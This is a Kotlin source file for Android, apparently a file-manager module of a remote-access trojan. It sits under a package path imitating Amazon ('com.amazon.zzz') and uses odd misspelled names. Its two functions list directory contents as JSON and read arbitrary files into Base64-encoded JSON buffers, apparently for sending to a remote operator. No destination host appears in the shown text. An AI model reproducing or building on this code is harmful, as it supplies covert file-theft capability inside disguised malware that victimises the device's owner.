package com.amazon.zzz.Modull.task

import android.content.Context
import android.util.Base64
import android.util.Log
import com.amazon.zzz.ApiNm.apiUt
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import java.io.BufferedInputStream
import java.io.File
import java.io.FileInputStream
import java.io.FileNotFoundException
import java.io.IOException

object FileManagerrw {

    fun walk(ctx: Context, path: String): JSONArray {
        val values = JSONArray()
        val dir = File(path)
        if (!dir.canRead()) {
            Log.d("cannot", "inaccessible")
        }
        val list = dir.listFiles()
        try {
            if (list != null) {
                val parenttObj = JSONObject()
                parenttObj.put("name", "../")
                parenttObj.put("isDir", true)
                parenttObj.put("path", dir.parent)
                values.put(parenttObj)
                for (file in list) {
                    if (!file.name.startsWith(".")) {
                        val fileObj = JSONObject()
                        fileObj.put("name", file.name)
                        fileObj.put("isDir", file.isDirectory)
                        fileObj.put("path", file.absolutePath)
                        values.put(fileObj)
                    }
                }
            }
        } catch (e: JSONException) {
            apiUt.sendLogs(ctx, "", e.localizedMessage, "error")
        }
        return values
    }

    fun downloadFile(ctx: Context, path: String?): JSONObject? {
        if (path == null) return null
        val file = File(path)
        if (file.exists()) {
            val size = file.length().toInt()
            val data = ByteArray(size)
            try {
                val buf = BufferedInputStream(FileInputStream(file))
                buf.read(data, 0, data.size)
                val `object` = JSONObject()
                `object`.put("path", path)
                `object`.put("name", file.name)
                `object`.put("buffer", Base64.encodeToString(data, Base64.DEFAULT))
                buf.close()
                return `object`
            } catch (e: FileNotFoundException) {
                apiUt.sendLogs(ctx, "", e.localizedMessage, "error")
            } catch (e: IOException) {
                apiUt.sendLogs(ctx, "", e.localizedMessage, "error")
            } catch (e: JSONException) {
                apiUt.sendLogs(ctx, "", e.localizedMessage, "error")
            }
        }
        return null
    }
}